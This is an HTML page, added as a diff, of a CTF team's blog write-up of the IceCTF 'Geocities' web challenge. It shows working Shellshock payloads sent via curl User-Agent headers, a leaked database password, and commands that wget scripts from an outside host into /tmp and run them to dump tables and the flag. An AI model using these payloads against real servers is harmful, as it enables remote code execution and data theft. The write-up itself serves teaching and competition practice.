@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  <title>IceCTF [web] - Geocities | TeamRocketIST - Portuguese CTF Team</title>
+  <meta name="description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in yea">
+<meta name="keywords" content="shellshock,web,perl,sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="IceCTF [web] - Geocities">
+<meta property="og:url" content="https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/index.html">
+<meta property="og:site_name" content="TEAMROCKETIST">
+<meta property="og:description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in yea">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2017-08-10T03:03:33.098Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="IceCTF [web] - Geocities">
+<meta name="twitter:description" content="I recently stumbled onto this old geocities site (http://geocities.vuln.icec.tf/), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in yea">
+  
+    <link rel="alternate" href="/atom.xml" title="TEAMROCKETIST" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/avatar.png" type="image/x-icon">
+  
+  <!-- font-awesome CSS -->
+  <link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+
+<body class="main-center">
+  <section class="mainside">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/teamrocketist" target="_blank">
+          <img class="thumb-xl img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">TeamRocketIST</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTF Team</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="fa fa-map-marker"></i> Lisbon, Portugal</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat"><i class="fa fa-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+            <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+            <!-- <span class="ins-close ins-selectable"><i class="fa fa-times"></i></span> -->
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse">
+      <ul class="nav navbar-nav main-nav">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="fa fa-fw fa-home"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="fa fa-fw fa-archive"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="fa fa-fw fa-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="fa fa-fw fa-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="fa fa-fw fa-code"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="fa fa-fw fa-gg"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="fa fa-fw fa-coffee"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      <div class="footer">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/teamrocketist" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="fa fa-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/teamrocketist" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="fa fa-twitter"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="fa fa-rss"></i></a></li>
+        
+    </ul>
+    
+    <div class="copyright">
+        &copy; 2017 TEAMROCKETIST
+        <div class="publishby">
+        	<!-- Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. -->
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</div>
+    </nav>
+  </div>
+</section>
+
+  
+    <section class="sidebar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            
+            <div class="content">
+                <p>PC MASTER RACE!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Crypto/">Crypto</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Forensics/">Forensics</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Misc/">Misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Network/">Network</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">7</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/LTE/">LTE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/">Misc</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RSA/">RSA</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/X-Forwarded-For/">X-Forwarded-For</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/base64/">base64</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bruteforce/">bruteforce</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/filterbypass/">filterbypass</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensics/">forensics</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gdb/">gdb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hash/">hash</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/java/">java</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/login/">login</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/md5/">md5</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mongodb/">mongodb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/network/">network</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/noSql/">noSql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pcap/">pcap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/perl/">perl</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/png/">png</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/regex/">regex</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellshock/">shellshock</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql/">sql</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sqli/">sqli</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/usb/">usb</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xor/">xor</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/LTE/" style="font-size: 13px;">LTE</a> <a href="/tags/Misc/" style="font-size: 13px;">Misc</a> <a href="/tags/RSA/" style="font-size: 13px;">RSA</a> <a href="/tags/X-Forwarded-For/" style="font-size: 13px;">X-Forwarded-For</a> <a href="/tags/base64/" style="font-size: 13px;">base64</a> <a href="/tags/bruteforce/" style="font-size: 13.33px;">bruteforce</a> <a href="/tags/crypto/" style="font-size: 13.67px;">crypto</a> <a href="/tags/filterbypass/" style="font-size: 13px;">filterbypass</a> <a href="/tags/forensics/" style="font-size: 13px;">forensics</a> <a href="/tags/gdb/" style="font-size: 13px;">gdb</a> <a href="/tags/hash/" style="font-size: 13px;">hash</a> <a href="/tags/java/" style="font-size: 13px;">java</a> <a href="/tags/login/" style="font-size: 13px;">login</a> <a href="/tags/md5/" style="font-size: 13.33px;">md5</a> <a href="/tags/mongodb/" style="font-size: 13px;">mongodb</a> <a href="/tags/network/" style="font-size: 13px;">network</a> <a href="/tags/noSql/" style="font-size: 13px;">noSql</a> <a href="/tags/pcap/" style="font-size: 13px;">pcap</a> <a href="/tags/perl/" style="font-size: 13px;">perl</a> <a href="/tags/png/" style="font-size: 13px;">png</a> <a href="/tags/python/" style="font-size: 13px;">python</a> <a href="/tags/regex/" style="font-size: 13px;">regex</a> <a href="/tags/reverse/" style="font-size: 13.67px;">reverse</a> <a href="/tags/shellshock/" style="font-size: 13px;">shellshock</a> <a href="/tags/sql/" style="font-size: 13px;">sql</a> <a href="/tags/sqli/" style="font-size: 13px;">sqli</a> <a href="/tags/usb/" style="font-size: 13px;">usb</a> <a href="/tags/web/" style="font-size: 14px;">web</a> <a href="/tags/wireshark/" style="font-size: 13px;">wireshark</a> <a href="/tags/xor/" style="font-size: 13px;">xor</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">August 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">July 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/07/">July 2016</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Network/">Network</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/07/Network-Sha2017-Abuse-Mail-300/" class="title">[Network] Sha2017 - Abuse Mail [300]</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-07T12:52:21.000Z" itemprop="datePublished">2017-08-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Web/">Web</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/02/Web-Bugs-Bunny-CTF-LQI-X-140/" class="title">[Web] Bugs Bunny CTF - LQI_X 140</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-02T10:29:58.000Z" itemprop="datePublished">2017-08-02</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/08/01/Reverse-BugsBunny-CTF-Rev75/" class="title">[Reverse] BugsBunny CTF - Rev75</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-08-01T08:03:50.000Z" itemprop="datePublished">2017-08-01</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev100/" class="title">[Reverse] Bugs Bunny CTF - Rev100</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-07-31T15:14:17.000Z" itemprop="datePublished">2017-07-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/Reverse/">Reverse</a>
+              </p>
+              <p class="item-title">
+                <a href="/2017/07/31/Reverse-Bugs-Bunny-CTF-Rev-50/" class="title">[Reverse] - Bugs Bunny CTF - Rev 50</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2017-07-31T14:16:03.000Z" itemprop="datePublished">2017-07-31</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</section>
+
+  
+  <section class="main">
+  <div class="content">
+  <article id="post-IceCTF-web-Geocities" class="article article-type-post" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      IceCTF [web] - Geocities
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="fa fa-calendar-check-o"></i>
+	<a href="/2016/08/27/IceCTF-web-Geocities/" class="article-date">
+	  <time datetime="2016-08-26T23:00:46.000Z" itemprop="datePublished">2016-08-27</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="fa fa-folder"></i>
+    <a class="article-category-link" href="/categories/Web/">Web</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="fa fa-tag"></i>
+	<a class="article-tag-link" href="/tags/perl/">perl</a>, <a class="article-tag-link" href="/tags/shellshock/">shellshock</a>, <a class="article-tag-link" href="/tags/sql/">sql</a>, <a class="article-tag-link" href="/tags/web/">web</a>
+  </span>
+
+
+        
+
+		
+		
+	
+		<span class="post-wordcount hidden-xs">Word Count: 744 (words)</span>
+	
+	
+		<span class="post-readcount hidden-xs">Read Time: 5 (min)</span>
+	
+
+      </div>
+    </header>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>I recently stumbled onto this old geocities site (<a href="http://geocities.vuln.icec.tf/" target="_blank" rel="external">http://geocities.vuln.icec.tf/</a>), it’s a miracle that it’s still up! It must be running some ancient technology and probably hasn’t been updated in years, it’s our lucky day boys!</blockquote>
+
+<p>After analyzing the website I didn’t found nothing until I started reading the messages where there was some hints, the blog posts were speaking about some websites made in perl and bash, and I started thinking there maybe were some CGI scripts on the website. I tryed to find any particular file in the cgi-bin folder but nothing. Until I did the most obvivious which was trying to access this “<a href="http://geocities.vuln.icec.tf/index.cgi" target="_blank" rel="external">http://geocities.vuln.icec.tf/index.cgi</a>“ and it existed! Now lets try some ShellShock with Curl:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/ls"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line"></div><div class="line">blog.html</div><div class="line">get_posts.pl</div><div class="line">img</div><div class="line">index.cgi</div></pre></td></tr></table></figure>
+<p>And it worked! now lets start looking into those files:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/cat get_posts.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line"></div><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line">use strict;</div><div class="line">use DBI;</div><div class="line"></div><div class="line">my <span class="variable">$dbh</span> = DBI-&gt;connect(</div><div class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    &#123; RaiseError =&gt; 1 &#125;,</div><div class="line">) or die <span class="variable">$DBI</span>::errstr;</div><div class="line"></div><div class="line">my <span class="variable">$sth</span> = <span class="variable">$dbh</span>-&gt;prepare(<span class="string">"SELECT * from Posts ORDER BY post_date DESC"</span>);</div><div class="line"><span class="variable">$sth</span>-&gt;execute();</div><div class="line"></div><div class="line">my <span class="variable">$row</span>;</div><div class="line"><span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$sth</span>-&gt;fetchrow_arrayref()) &#123;</div><div class="line">    <span class="built_in">print</span> <span class="string">"@<span class="variable">$row</span>[1];@<span class="variable">$row</span>[2];@<span class="variable">$row</span>[3]\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="variable">$sth</span>-&gt;finish();</div><div class="line"><span class="variable">$dbh</span>-&gt;disconnect();</div></pre></td></tr></table></figure>
+<p>Oh a perl script that connects to a sql databases maybe our flag is somewhere in that database! but first we need to access it! After this I tried a reverse shell but It wasn’t working so I just tried to access mysql with the command since we already had the credentials from the source above, but failed to execute even trying the most common locations of mysql (maybe the admins deactivated this for security reasons for the current user running the website) then I thought of replicate the perl script above and send it to /tmp folder and execute it.</p>
+<p>The first thing I had to do was to know what is the name of the other sql tables this could be easy with a select to the informationschema tables:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> DBI;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>(</div><div class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    &#123; <span class="string">RaiseError =&gt;</span> <span class="number">1</span> &#125;,</div><div class="line">) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT TABLE_NAME from information_schema.tables WHERE table_schema = 'geocities'"</span>);</div><div class="line">$sth-&gt;execute();</div><div class="line"></div><div class="line"><span class="keyword">my</span> @row;</div><div class="line"><span class="keyword">while</span> (@row = $sth-&gt;fetchrow_array) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">", "</span>, @row), <span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sth-&gt;finish();</div><div class="line">$dbh-&gt;disconnect();</div></pre></td></tr></table></figure>
+<p>Now we need to upload this to /tmp and chmod it to get execute permissions and finally execute it:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /usr/bin/wget hostedwebserver.com/plz.pl -O /tmp/plz.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/chmod +x /tmp/plz.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/cat /tmp/plz.pl"</span> http://geocities.vuln.icec.tf/index.cgi </div><div class="line">47a6fd2ca39d2b0d6eea1c30008dd889</div><div class="line">Posts</div></pre></td></tr></table></figure>
+<p>So we have two database tables one named posts and the other named 47a6fd2ca39d2b0d6eea1c30008dd889, now we only need to select everything from this one and see if the flag is in it:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/perl</span></div><div class="line"></div><div class="line"><span class="keyword">use</span> strict;</div><div class="line"><span class="keyword">use</span> DBI;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $dbh = DBI-&gt;<span class="keyword">connect</span>(</div><div class="line">    <span class="string">"dbi:mysql:dbname=geocities;host=icectf_mariadb"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    <span class="string">"geocities"</span>,</div><div class="line">    &#123; <span class="string">RaiseError =&gt;</span> <span class="number">1</span> &#125;,</div><div class="line">) <span class="keyword">or</span> <span class="keyword">die</span> $DBI::errstr;</div><div class="line"></div><div class="line"><span class="keyword">my</span> $sth = $dbh-&gt;prepare(<span class="string">"SELECT * from 47a6fd2ca39d2b0d6eea1c30008dd889"</span>);</div><div class="line">$sth-&gt;execute();</div><div class="line"></div><div class="line"><span class="keyword">my</span> @row;</div><div class="line"><span class="keyword">while</span> (@row = $sth-&gt;fetchrow_array) &#123;</div><div class="line">    <span class="keyword">print</span> <span class="keyword">join</span>(<span class="string">", "</span>, @row), <span class="string">"\n"</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$sth-&gt;finish();</div><div class="line">$dbh-&gt;disconnect();</div></pre></td></tr></table></figure>
+<p>Same process again to upload and run the perl script:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /usr/bin/wget hostedwebserver.com/tables.pl -O /tmp/tables.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /bin/chmod +x /tmp/tables.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">kinyabitch@Debian ~/h/c/geocities&gt; curl -H <span class="string">"User-Agent: () &#123; test;&#125;;echo \"Content-type: text/plain\"; echo; echo; /tmp/tables.pl"</span> http://geocities.vuln.icec.tf/index.cgi</div><div class="line">1, IceCTF&#123;7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7&#125;</div></pre></td></tr></table></figure>
+<p>And jackpot the flag is IceCTF{7h3_g0s_WEr3_5UpeR_wE1Rd_mY_3ye5_HUr7}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <blockquote>
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link">
+      <strong>Link to this article：</strong>
+      <a href="https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/" title="IceCTF [web] - Geocities" target="_blank" rel="external">https://teamrocketist.github.io/2016/08/27/IceCTF-web-Geocities/</a>
+    </li>
+    
+    <!--li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li-->
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/teamrocketist" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/teamrocketist" target="_blank"><span class="text-dark">TeamRocketIST</span><small class="ml-1x">CTF Team</small></a></h3>
+        <div>Portuguese Computer Science Students</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </footer>
+  </article>
+  
+    
+  <div id="comments"></div>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2016/08/29/ctfx-Web-HarambeHub-100pts/" title="ctfx [Web] - HarambeHub [100pts]"><i class="fa fa-angle-left" aria-hidden="true"></i>&nbsp;&nbsp;Newer</a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2016/08/26/IceCTF-Cryptography-Hill-Cipher/" title="IceCTF [Cryptography] - Hill Cipher">Older&nbsp;&nbsp;<i class="fa fa-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    <div class="share-component" data-sites="facebook,twitter" data-mobile-sites="facebook,twitter"></div>
+  </div>
+  
+</nav>
+
+</section>
+
+  <script src="https://cdn.bootcss.com/jquery/1.12.4/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script src="/js/plugin.js"></script>
+<script src="/js/application.js"></script>
+
+
+
+  <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
